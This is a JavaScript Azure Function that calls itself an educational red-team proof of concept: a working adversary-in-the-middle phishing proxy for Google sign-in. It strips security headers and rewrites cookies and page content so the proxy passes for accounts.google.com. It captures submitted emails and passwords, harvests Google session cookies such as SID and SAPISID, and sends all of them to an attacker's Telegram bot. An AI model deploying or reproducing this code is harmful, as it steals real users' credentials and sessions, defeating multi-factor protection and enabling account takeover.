/**
 * Google AiTM Function PoC - Reverse Proxy for accounts.google.com
 * For educational / red-team purposes only.
 * Based on the Azure AiTM concept by Nicola Suter.
 * 
 * Strips security headers, rewrites cookie domains, harvests credentials
 * and GAIA session cookies from Google authentication flows.
 */

const { app } = require("@azure/functions");

const upstream = "accounts.google.com";
const upstream_path = "";
const telegram_bot_token = process.env.TELEGRAM_BOT_TOKEN;
const telegram_chat_id = process.env.TELEGRAM_CHAT_ID;

// Headers to strip from upstream responses — these would break the proxy
const delete_headers = [
  "content-security-policy",
  "content-security-policy-report-only",
  "clear-site-data",
  "x-frame-options",
  "referrer-policy",
  "strict-transport-security",
  "content-length",
  "content-encoding",
  "transfer-encoding",
];

async function dispatchTelegram(message) {
  context?.log?.(message);
  if (telegram_bot_token && telegram_chat_id) {
    const url = `https://api.telegram.org/bot${telegram_bot_token}/sendMessage`;
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: telegram_chat_id,
        text: message,
        parse_mode: "HTML",
      }),
    })
      .then((r) =>
        r.ok
          ? console.log("Telegram dispatch OK")
          : console.error(`Telegram dispatch failed: ${r.statusText}`)
      )
      .catch((e) => console.error("Telegram dispatch error:", e));
  }
}

app.http("phishing", {
  methods: ["GET", "POST"],
  authLevel: "anonymous",
  route: "/{*x}",
  handler: async (request, context) => {
    // Save context for dispatchTelegram
    global.context = context;

    const upstream_url = new URL(request.url);
    const original_url = new URL(request.url);

    // Rewrite host to accounts.google.com
    upstream_url.host = upstream;
    upstream_url.port = 443;
    upstream_url.protocol = "https:";

    // Sanitize query string — rewrite params like continue, followup, state
    // that contain our proxy domain back to accounts.google.com so Google
    // doesn't reject them with 400 Bad Request
    const sanitizeParams = ["continue", "followup", "state", "service", "dsh", "flowName", "cid"];
    let modifiedSearch = false;
    for (const [key, value] of upstream_url.searchParams.entries()) {
      if (sanitizeParams.includes(key) && value.includes(original_url.host)) {
        const decoded = decodeURIComponent(value);
        const fixed = decoded.replace(
          new RegExp("https?://" + original_url.host.replace(/\./g, "\\."), "g"),
          "https://" + upstream
        );
        upstream_url.searchParams.set(key, fixed);
        modifiedSearch = true;
      }
    }
    if (modifiedSearch) {
      context.log("Sanitized query params for upstream compatibility");
    }

    if (upstream_url.pathname === "/") {
      upstream_url.pathname = upstream_path;
    } else {
      // Strip leading slash from incoming path and join cleanly
      incoming_path = upstream_url.pathname.replace(/^\//, '');
      upstream_url.pathname = (upstream_path ? upstream_path.replace(/\/$/, '') + '/' : '') + incoming_path;
    }

    context.log(
      `Proxying ${request.method}: ${original_url.pathname} -> ${upstream_url.href}`
    );

    // Build request headers for upstream
    const new_request_headers = new Headers(request.headers);
    new_request_headers.set("Host", upstream_url.host);
    new_request_headers.set("accept-encoding", "gzip;q=0,deflate;q=0");
    new_request_headers.set(
      "user-agent",
      "GoogleAiTMFunction/1.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    );
    new_request_headers.set(
      "Referer",
      original_url.protocol + "//" + original_url.host
    );
    new_request_headers.delete("origin");

    // ---------- CREDENTIAL HARVESTING ----------
    if (request.method === "POST") {
      const temp_req = await request.clone();
      const body = await temp_req.text();

      // Google login form fields
      const params = new URLSearchParams(body);
      const email = params.get("Email");
      const passwd = params.get("Passwd");
      const passwdAgain = params.get("PasswdAgain"); // 2FA / new password

      if (email && passwd) {
        const msg = `🔑 <b>Google Credentials Captured</b>\n<b>Email:</b> ${email}\n<b>Password:</b> ${passwd}`;
        if (passwdAgain) {
          dispatchTelegram(msg + `\n<b>PasswdAgain:</b> ${passwdAgain}`);
        } else {
          dispatchTelegram(msg);
        }
      }
    }

    // ---------- FORWARD TO GOOGLE ----------
    const original_response = await fetch(upstream_url.href, {
      method: request.method,
      headers: new_request_headers,
      body: request.method === "POST" ? await request.text() : undefined,
      duplex: "half",
      redirect: "manual", // Don't follow redirects — we need to intercept them
    });

    // Handle websocket upgrade transparently
    if (
      request.headers.get("Upgrade") &&
      request.headers.get("Upgrade").toLowerCase() === "websocket"
    ) {
      return original_response;
    }

// Adjust response headers
    const new_response_headers = new Headers(original_response.headers);
    delete_headers.forEach((h) => new_response_headers.delete(h));

    // Remove content-length since we're modifying bodies
    new_response_headers.delete("content-length");
    new_response_headers.delete("content-encoding");

    // ---------- COOKIE HANDLING ----------
    try {
      const originalCookies = original_response.headers.getSetCookie();
      const cookieDomain = original_url.host.split(':')[0]; // Strip port for cookie Domain

      originalCookies.forEach((originalCookie) => {
        let modifiedCookie = originalCookie
          .replace(new RegExp(upstream_url.host.replace(/\./g, "\\."), "g"), cookieDomain)
          .replace(/Domain=\.google\.com/gi, `Domain=${cookieDomain}`)
          .replace(/Domain=google\.com/gi, `Domain=${cookieDomain}`)
          .replace(/Domain=accounts\.google\.com/gi, "")
          .replace(/; ?Domain=[^;]*;/, ";")
          .replace(/SameSite=None/gi, "SameSite=Lax")
          .replace(/SameSite=Strict/gi, "SameSite=Lax");

        // __Host- cookies: must have Path=/, Secure, and NO Domain
        // Keep Secure (Azure Functions uses HTTPS), strip Domain
        if (modifiedCookie.includes("__Host-")) {
          modifiedCookie = modifiedCookie.replace(/Domain=[^;]+;?/gi, "");
          // Ensure Path=/ exists
          if (!modifiedCookie.toLowerCase().includes("path=/")) {
            modifiedCookie = modifiedCookie.replace(/; ?Secure/, "; Path=/; Secure");
          }
        }

        // __Secure- cookies: must have Secure — keep it
        // Just ensure no invalid Domain with port
        if (modifiedCookie.includes("__Secure-")) {
          modifiedCookie = modifiedCookie.replace(/Domain=[^;]+;?/gi, "");
        }

        // Remove any empty Domain= remnants
        modifiedCookie = modifiedCookie.replace(/;\s*Domain=;?/gi, ";");
        modifiedCookie = modifiedCookie.replace(/;\s*Domain=\s*$/gi, "");

        new_response_headers.append("Set-Cookie", modifiedCookie);
      });

      // Detect Google session cookies
      const googleSessionCookies = originalCookies.filter(
        (cookie) =>
          cookie.startsWith("SAPISID=") ||
          cookie.startsWith("SSID=") ||
          cookie.startsWith("HSID=") ||
          cookie.startsWith("APISID=") ||
          cookie.startsWith("SID=") ||
          cookie.startsWith("LSID=") ||
          cookie.startsWith("SMSID=") ||
          cookie.startsWith("__Secure-") ||
          cookie.startsWith("GAIA_") ||
          cookie.startsWith("OSID=") ||
          cookie.startsWith("ACCOUNT_CHOOSER=") ||
          cookie.startsWith("AUTH_USER=")
      );

      if (googleSessionCookies.length >= 2) {
        dispatchTelegram(
          `🍪 <b>Google Session Cookies Captured</b> (${googleSessionCookies.length} cookies)\n<code>${googleSessionCookies.join("\n")}</code>`
        );
      }
    } catch (error) {
      console.error("Cookie handling error:", error);
    }

    // ---------- RESPONSE BODY REWRITING ----------
    // Replace all references to accounts.google.com with our domain
    let bodyText = await original_response.text();

    // Rewrite URLs in the response body
    bodyText = bodyText.replace(
      new RegExp(
        "https://" + upstream_url.host.replace(/\./g, "\\."),
        "g"
      ),
      original_url.protocol + "//" + original_url.host
    );
    bodyText = bodyText.replace(
      new RegExp(
        "http://" + upstream_url.host.replace(/\./g, "\\."),
        "g"
      ),
      original_url.protocol + "//" + original_url.host
    );
    bodyText = bodyText.replace(
      new RegExp(
        "//" + upstream_url.host.replace(/\./g, "\\."),
        "g"
      ),
      "//" + original_url.host
    );

    // Handle redirect interception — if Google tries to redirect to itself, rewrite
    const location = new_response_headers.get("location");
    if (location && location.includes(upstream)) {
      new_response_headers.set(
        "location",
        location.replace(
          new RegExp("https?://" + upstream_url.host.replace(/\./g, "\\."), "g"),
          original_url.protocol + "//" + original_url.host
        )
      );
    }

    return new Response(bodyText, {
      status: original_response.status,
      headers: new_response_headers,
    });
  },
});